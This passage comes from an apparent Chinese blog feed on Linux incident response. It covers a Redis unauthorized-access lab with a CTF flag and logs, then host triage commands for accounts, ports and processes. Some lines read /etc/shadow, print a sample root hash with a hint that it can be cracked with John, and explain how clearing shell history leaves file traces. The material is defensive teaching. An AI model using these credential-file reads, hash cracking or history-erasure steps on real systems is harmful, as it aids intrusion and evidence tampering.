class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost defend]<span class="comment"># find / -name redis*</span></span><br><span class="line">find: ‘/proc/3456’: 没有那个文件或目录</span><br><span class="line">/sys/fs/selinux/booleans/redis_enable_notify</span><br><span class="line">/etc/logrotate.d/redis</span><br><span class="line">/etc/systemd/system/redis-sentinel.service.d</span><br><span class="line">/etc/systemd/system/redis.service.d</span><br><span class="line">/etc/selinux/targeted/active/modules/100/redis</span><br><span class="line">/etc/redis.conf</span><br><span class="line">/etc/redis-sentinel.conf</span><br><span class="line">/var/lib/redis</span><br><span class="line">/var/log/redis</span><br><span class="line">/var/log/redis/redis.log</span><br><span class="line">/usr/bin/redis-benchmark</span><br><span class="line">/usr/bin/redis-check-aof</span><br><span class="line">/usr/bin/redis-check-rdb</span><br><span class="line">/usr/bin/redis-cli</span><br><span class="line">/usr/bin/redis-sentinel</span><br><span class="line">/usr/bin/redis-server</span><br><span class="line">/usr/lib/systemd/system/redis-sentinel.service</span><br><span class="line">/usr/lib/systemd/system/redis.service</span><br><span class="line">/usr/lib/python2.7/site-packages/sos/plugins/redis.py</span><br><span class="line">/usr/lib/python2.7/site-packages/sos/plugins/redis.pyc</span><br><span class="line">/usr/lib/python2.7/site-packages/sos/plugins/redis.pyo</span><br><span class="line">/usr/lib/firewalld/services/redis.xml</span><br><span class="line">/usr/share/doc/redis-3.2.12</span><br><span class="line">/usr/share/licenses/redis-3.2.12</span><br><span class="line">/usr/share/augeas/lenses/dist/redis.aug</span><br><span class="line">/usr/share/man/man1/redis-benchmark.1.gz</span><br><span class="line">/usr/share/man/man1/redis-check-aof.1.gz</span><br><span class="line">/usr/share/man/man1/redis-check-rdb.1.gz</span><br><span class="line">/usr/share/man/man1/redis-cli.1.gz</span><br><span class="line">/usr/share/man/man1/redis-sentinel.1.gz</span><br><span class="line">/usr/share/man/man1/redis-server.1.gz</span><br><span class="line">/usr/share/man/man5/redis-sentinel.conf.5.gz</span><br><span class="line">/usr/share/man/man5/redis.conf.5.gz</span><br><span class="line">/usr/libexec/redis-shutdown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost defend]<span class="comment"># more /etc/redis.conf</span></span><br><span class="line">flag&#123;P@ssW0rd_redis&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看一下有没有设置密码</span></span><br><span class="line">[root@localhost defend]<span class="comment"># cat /etc/redis.conf |grep requirepass</span></span><br><span class="line"><span class="comment"># If the master is password protected (using the &quot;requirepass&quot; configuration</span></span><br><span class="line"><span class="comment"># requirepass foobared</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 并且是监听所有网卡.怀疑是未授权访问.查看redis日志</span></span><br><span class="line">[root@localhost defend]<span class="comment"># cat /etc/redis.conf |grep bind</span></span><br><span class="line"><span class="comment"># By default, if no &quot;bind&quot; configuration directive is specified, Redis listens</span></span><br><span class="line"><span class="comment"># the &quot;bind&quot; configuration directive, followed by one or more IP addresses.</span></span><br><span class="line"><span class="comment"># bind 192.168.1.100 10.0.0.1</span></span><br><span class="line"><span class="comment"># bind 127.0.0.1 ::1</span></span><br><span class="line"><span class="comment"># internet, binding to all the interfaces is dangerous and will expose the</span></span><br><span class="line"><span class="comment"># following bind directive, that will force Redis to listen only into</span></span><br><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line"><span class="comment"># 1) The server is not binding explicitly to a set of addresses using the</span></span><br><span class="line"><span class="comment">#    &quot;bind&quot; directive.</span></span><br><span class="line"><span class="comment"># are explicitly listed using the &quot;bind&quot; directive.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看日志</span></span><br><span class="line">[root@localhost defend]<span class="comment"># cat /var/log/redis/redis.log |grep Acc</span></span><br><span class="line">11111:M 18 Mar 19:27:54.895 - Accepted 127.0.0.1:41590</span><br><span class="line">11595:M 18 Mar 19:27:57.321 - Accepted 192.168.75.129:54766</span><br><span class="line">11595:M 18 Mar 19:39:31.996 - Accepted 192.168.75.129:53104</span><br><span class="line">11595:M 18 Mar 19:39:34.052 - Accepted 192.168.75.129:57672</span><br><span class="line">11595:M 18 Mar 19:44:53.399 - Accepted 127.0.0.1:41594</span><br><span class="line">12234:M 18 Mar 19:47:02.153 - Accepted 192.168.75.129:45240</span><br><span class="line">12234:M 18 Mar 19:47:03.612 - Accepted 192.168.75.129:53124</span><br><span class="line">12234:M 18 Mar 19:53:40.994 - Accepted 127.0.0.1:41596</span><br><span class="line">12559:M 18 Mar 19:53:45.397 - Accepted 192.168.75.129:44572</span><br><span class="line">12559:M 18 Mar 19:53:46.807 - Accepted 192.168.75.129:44582</span><br><span class="line">12559:M 18 Mar 20:20:57.221 - Accepted 127.0.0.1:41598</span><br><span class="line">13274:M 18 Mar 20:21:56.411 - Accepted 192.168.75.129:54826</span><br><span class="line">13274:M 18 Mar 20:21:58.333 - Accepted 192.168.75.129:54836</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407152023528.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407152023758.png" data-fancybox="true"/></div></div><h2 id="系统应急响应"><a href="#系统应急响应" class="headerlink" title="系统应急响应"></a>系统应急响应</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录成功的日期、用户名、IP:</span></span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span> </span><br><span class="line"><span class="comment"># last</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407152023635.png" data-fancybox="true"/></div></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Linux" scheme="https://jiangjiyue.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>应急响应之Linux</title>
    <link href="https://jiangjiyue.github.io/2024/07/12/b7b8d727/"/>
    <id>https://jiangjiyue.github.io/2024/07/12/b7b8d727/</id>
    <published>2024-07-11T17:08:49.000Z</published>
    <updated>2024-07-30T07:01:36.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 21.15K </p>    </div>    <div class="cell" style="">    <p>代码: 18.27K, 文本: 1.28K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.42 小时</p>    </div>    </div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202302161452524.png" data-fancybox="true"/></div></div><h2 id="入侵排查思路"><a href="#入侵排查思路" class="headerlink" title="入侵排查思路"></a>入侵排查思路</h2><h3 id="系统基本信息"><a href="#系统基本信息" class="headerlink" title="系统基本信息"></a>系统基本信息</h3><ol><li>lscpu查看cpu信息</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># lscpu</span></span><br><span class="line">Architecture:          x86_64</span><br><span class="line">CPU op-mode(s):        32-bit, 64-bit</span><br><span class="line">Byte Order:            Little Endian</span><br><span class="line">CPU(s):                4</span><br><span class="line">On-line CPU(s) list:   0-3</span><br><span class="line">Thread(s) per core:    1</span><br><span class="line">Core(s) per socket:    1</span><br><span class="line">座：                 4</span><br><span class="line">NUMA 节点：         1</span><br><span class="line">厂商 ID：           GenuineIntel</span><br><span class="line">CPU 系列：          6</span><br><span class="line">型号：              158</span><br><span class="line">型号名称：        Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz</span><br><span class="line">步进：              9</span><br><span class="line">CPU MHz：             2496.004</span><br><span class="line">BogoMIPS：            4992.00</span><br><span class="line">超管理器厂商：  VMware</span><br><span class="line">虚拟化类型：     完全</span><br><span class="line">L1d 缓存：          32K</span><br><span class="line">L1i 缓存：          32K</span><br><span class="line">L2 缓存：           256K</span><br><span class="line">L3 缓存：           6144K</span><br><span class="line">NUMA 节点0 CPU：    0-3</span><br><span class="line">Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon nopl xtopology tsc_reliable nonstop_tsc eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single ssbd ibrs ibpb stibp fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid rdseed adx smap clflushopt xsaveopt xsavec xgetbv1 arat md_clear spec_ctrl intel_stibp flush_l1d arch_capabilities</span><br></pre></td></tr></table></figure><ol start="2"><li>操作系统信息</li></ol>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># uname -a</span></span><br><span class="line">Linux localhost.localdomain 3.10.0-1160.el7.x86_64 <span class="comment">#1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># cat /etc/*release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line">NAME=<span class="string">&quot;CentOS Linux&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;7 (Core)&quot;</span></span><br><span class="line">ID=<span class="string">&quot;centos&quot;</span></span><br><span class="line">ID_LIKE=<span class="string">&quot;rhel fedora&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;7&quot;</span></span><br><span class="line">PRETTY_NAME=<span class="string">&quot;CentOS Linux 7 (Core)&quot;</span></span><br><span class="line">ANSI_COLOR=<span class="string">&quot;0;31&quot;</span></span><br><span class="line">CPE_NAME=<span class="string">&quot;cpe:/o:centos:centos:7&quot;</span></span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.centos.org/&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.centos.org/&quot;</span></span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=<span class="string">&quot;CentOS-7&quot;</span></span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=<span class="string">&quot;7&quot;</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT=<span class="string">&quot;centos&quot;</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=<span class="string">&quot;7&quot;</span></span><br><span class="line"></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># lsb_release -a</span></span><br></pre></td></tr></table></figure><h3 id="账号安全"><a href="#账号安全" class="headerlink" title="账号安全"></a>账号安全</h3><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ol><li><p>用户信息文件<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名:密码:用户ID:组ID:用户说明:家目录:登陆之后shell</span></span><br><span class="line"><span class="comment"># 注意:无密码只允许本机登陆,远程不允许登陆</span></span><br></pre></td></tr></table></figure></li><li><p>影子文件<code>/etc/shadow</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$oGs1PqhL2p3ZetrE<span class="variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line"><span class="comment"># 用户名:加密密码:密码最后一次修改日期:两次密码的修改时间间隔:密码有效期:密码修改到期到的警告天数:密码过期之后的宽限天数:账号失效时间:保留</span></span><br><span class="line"><span class="comment"># 可以用john碰撞解密</span></span><br></pre></td></tr></table></figure></li><li><p><code>/etc/sudoers</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[loneferret@localhost ~]$ sudo -l</span><br><span class="line">User loneferret may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: !/usr/bin/su</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/ht</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户 loneferret 在这个系统上有以下权限：</span></span><br><span class="line"><span class="comment"># 可以以 root 权限运行 /usr/local/bin/ht 命令，而无需输入密码。</span></span><br><span class="line"><span class="comment"># 不能以 root 权限运行 /usr/bin/su 命令。</span></span><br></pre></td></tr></table></figure></li><li><p>几个常用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># who 命令用于查看当前登录的用户。输出显示当前用户的会话类型（tty 表示本地登录，pts 表示远程登录）。</span></span><br><span class="line"><span class="built_in">who</span></span><br><span class="line"><span class="comment"># 输出示例：</span></span><br><span class="line"><span class="comment"># loneferret tty7         2023-10-01 08:45 (:0)</span></span><br><span class="line"><span class="comment"># user2      pts/1        2023-10-01 09:00 (192.168.1.100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># w 命令用于查看系统信息和用户在做什么。输出包括用户、TTY、远程主机、登录时间、空闲时间、JCPU、PCPU 和当前正在执行的命令。</span></span><br><span class="line">w</span><br><span class="line"><span class="comment"># 输出示例：</span></span><br><span class="line"><span class="comment"># 10:30:45 up  2:15,  2 users,  load average: 0.00, 0.01, 0.05</span></span><br><span class="line"><span class="comment"># USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span></span><br><span class="line"><span class="comment"># loneferret tty7     :0               08:45   2:15m  0.10s  0.10s /usr/bin/X</span></span><br><span class="line"><span class="comment"># user2      pts/1    192.168.1.100    09:00   1:30   0.20s  0.15s /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uptime 命令用于查看系统已运行时间、当前登录用户数及系统负载平均值。</span></span><br><span class="line"><span class="built_in">uptime</span></span><br><span class="line"><span class="comment"># 输出示例：</span></span><br><span class="line"><span class="comment"># 10:30:45 up  2:15,  2 users,  load average: 0.00, 0.01, 0.05</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h4><ol><li><p>查询特权用户特权用户<code>(uid为0)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该 awk 命令用于从 /etc/passwd 文件中找出 UID 为 0 的账户名。</span></span><br><span class="line">awk -F: <span class="string">&#x27;&#123;if($3==0) print $1&#125;&#x27;</span> /etc/passwd</span><br><span class="line"><span class="comment"># 代码含义：</span></span><br><span class="line"><span class="comment"># 使用 awk 命令 -F 指定分割符为冒号，读取 /etc/passwd 文件</span></span><br><span class="line"><span class="comment"># 如果第三列（UID）的值恒等于 0，则输出第一列的值（账户名）</span></span><br><span class="line"><span class="comment"># 在 Linux 系统中，UID 为 0 的账户通常只有 root 用户才有</span></span><br><span class="line"><span class="comment"># 如果出现别的账户 UID 为 0，则需要特别关注，可能存在安全风险</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户 ID (UID) 在 Linux 系统中有几种类型：</span></span><br><span class="line"><span class="comment"># 1. 超级用户 (root) UID: 0</span></span><br><span class="line"><span class="comment">#    - root 用户拥有最高权限，可以执行任何操作</span></span><br><span class="line"><span class="comment"># 2. 系统用户 UID: 1-999 (某些系统为 1-1000)</span></span><br><span class="line"><span class="comment">#    - 系统用户用于系统服务和守护进程</span></span><br><span class="line"><span class="comment">#    - 例如：daemon、bin、sys 等</span></span><br><span class="line"><span class="comment"># 3. 普通用户 UID: 1000 及以上</span></span><br><span class="line"><span class="comment">#    - 普通用户用于实际登录和操作系统的用户</span></span><br><span class="line"><span class="comment">#    - 例如：用户创建的账户，如 alice、bob</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># awk -F: &#x27;&#123;if($3==0) print $1&#125;&#x27; /etc/passwd</span></span><br><span class="line">root</span><br><span class="line">defend</span><br></pre></td></tr></table></figure></li><li><p>查询可以远程登录的帐号信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># cat /etc/passwd | grep -v &quot;nologin&quot;</span></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"><span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">defend:x:0:0:defend:/home/defend:/bin/bash</span><br></pre></td></tr></table></figure></li><li><p>除root帐号外,其他帐号是否存在sudo权限.如非管理需要,普通帐号应删除sudo权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># more /etc/sudoers | grep -v &quot;^#|^$&quot; | grep &quot;ALL=(ALL)&quot;</span></span><br><span class="line">rootALL=(ALL) ALL</span><br><span class="line">%wheelALL=(ALL)ALL</span><br><span class="line"><span class="comment"># %wheelALL=(ALL)NOPASSWD: ALL</span></span><br></pre></td></tr></table></figure></li><li><p>禁用或删除多余及可疑的帐号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usermod -L user   <span class="comment"># 禁用帐号,帐号无法登录,/etc/shadow 第二栏为!开头</span></span><br><span class="line">userdel user      <span class="comment"># 删除 user 用户</span></span><br><span class="line">userdel -r user   <span class="comment"># 将删除user用户,并且将/home目录下的user目录一并删除</span></span><br></pre></td></tr></table></figure></li><li><p>查看空口令账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># awk -F : &#x27;($2 == &quot;!!&quot;) &#123;print $1&#125;&#x27; /etc/shadow</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># awk -F : &#x27;$2==&quot;x&quot; &#123;print $1,$7&#125;&#x27; /etc/passwd | grep -v nologin</span></span><br><span class="line">root /bin/bash</span><br><span class="line"><span class="built_in">sync</span> /bin/sync</span><br><span class="line">shutdown /sbin/shutdown</span><br><span class="line">halt /sbin/halt</span><br><span class="line">defend /bin/bash</span><br><span class="line">shell_exec /bin/bash</span><br></pre></td></tr></table></figure></li><li><p>查看用户错误的登录信息:<code>lastb</code></p></li><li><p>查看所有用户最后的登录信息:<code>lastlog</code></p></li><li><p>查看用户最近登录信息:<code>last</code></p></li></ol><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><p>通过<code>.bash_history</code>查看帐号执行过的系统命令</p><ol><li><p>root的历史命令<code>histroy</code></p></li><li><p>打开<code>/home</code>各帐号目录下的<code>.bash_history</code>,查看普通帐号的历史命令</p><ol><li><p>为历史的命令增加登录的IP地址、执行命令时间等信息:</p></li><li><p>保存 1 万条命令<code>sed -i &#39;s/^HISTSIZE=1000/HISTSIZE=10000/g&#39; /etc/profile</code></p></li><li><p>在<code>/etc/profile</code>的文件尾部添加如下行数配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######jiagu history xianshi#########</span></span><br><span class="line">USER_IP=$(<span class="built_in">who</span> -u am i 2&gt;/dev/null | awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span> | sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$USER_IP</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  USER_IP=$(hostname)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">export</span> HISTTIMEFORMAT=<span class="string">&quot;%F %T <span class="variable">$USER_IP</span> <span class="subst">$(whoami)</span> &quot;</span></span><br><span class="line"><span class="built_in">shopt</span> -s histappend</span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;history -a&quot;</span></span><br><span class="line"><span class="comment">######### jiagu history xianshi ##########</span></span><br></pre></td></tr></table></figure></li><li><p><code>source /etc/profile</code>让配置生效,效果为:<code>2018-07-10 19:45:39 192.168.204.1 root source /etc/profile</code></p></li></ol></li><li><p>历史操作命令的清除:<code>history -c</code>但此命令并不会清除保存在文件中的记录,因此需要手动删除<code>.bash_profile</code>文件中的记录.</p></li></ol><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># netstat分析可疑端口，可以ip地址，可以PID及程序进程</span></span><br><span class="line">-a all显示所有的选项</span><br><span class="line">-t tcp仅显示tcp连接</span><br><span class="line">-u 仅显示udp连接</span><br><span class="line">-p 显示对应的程序名</span><br><span class="line">[root@localhost ~]<span class="comment"># netstat -atup</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:sunrpc          0.0.0.0:*               LISTEN      760/rpcbind         </span><br><span class="line">tcp        0      0 localhost.locald:domain 0.0.0.0:*               LISTEN      1633/dnsmasq        </span><br><span class="line">tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      1094/sshd           </span><br><span class="line">tcp        0      0 localhost:ipp           0.0.0.0:*               LISTEN      1092/cupsd          </span><br><span class="line">tcp        0      0 localhost:smtp          0.0.0.0:*               LISTEN      1335/master         </span><br><span class="line">tcp6       0      0 [::]:sunrpc             [::]:*                  LISTEN      760/rpcbind         </span><br><span class="line">tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      1094/sshd           </span><br><span class="line">tcp6       0      0 localhost:ipp           [::]:*                  LISTEN      1092/cupsd          </span><br><span class="line">tcp6       0      0 localhost:smtp          [::]:*                  LISTEN      1335/master         </span><br><span class="line">udp        0      0 0.0.0.0:923             0.0.0.0:*                           760/rpcbind         </span><br><span class="line">udp        0      0 0.0.0.0:mdns            0.0.0.0:*                           789/avahi-daemon: r </span><br><span class="line">udp        0      0 0.0.0.0:38280           0.0.0.0:*                           789/avahi-daemon: r </span><br><span class="line">udp        0      0 localhost.locald:domain 0.0.0.0:*                           1633/dnsmasq        </span><br><span class="line">udp        0      0 0.0.0.0:bootps          0.0.0.0:*                           1633/dnsmasq        </span><br><span class="line">udp        0      0 0.0.0.0:sunrpc          0.0.0.0:*                           760/rpcbind         </span><br><span class="line">udp        0      0 localhost:323           0.0.0.0:*                           800/chronyd         </span><br><span class="line">udp6       0      0 [::]:923                [::]:*                              760/rpcbind         </span><br><span class="line">udp6       0      0 [::]:sunrpc             [::]:*                              760/rpcbind         </span><br><span class="line">udp6       0      0 localhost:323           [::]:*                              800/chronyd         </span><br></pre></td></tr></table></figure><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><blockquote><p>进程是系统进行资源分配和调度的基本单位，是操作系统结构的基础</p><p>无论是Windows还是Linux，主机在感染恶意程序后，恶意程序都会启动相应的进程，来完成相关恶意操作，有的进程为了不为查杀，还会启动守护进程对恶意进程进行守护</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根据PID的值,可查看其对应的可执行程序.</span></span><br><span class="line"><span class="comment"># -a：显示所有文件，包括以.开头的隐藏文件。</span></span><br><span class="line"><span class="comment"># -l：使用长格式列出文件信息，包括权限、所有者、大小和修改时间等。</span></span><br><span class="line"><span class="comment"># -t：按修改时间排序，最近修改的文件显示在最前面。</span></span><br><span class="line">[root@localhost ~]<span class="comment"># ls -alt /proc/1094</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过lsof -p PID，查看进程所打开的文件</span></span><br><span class="line">[root@localhost ~]<span class="comment"># lsof -p 1094</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看进程树</span></span><br><span class="line">pstree</span><br><span class="line"><span class="comment"># 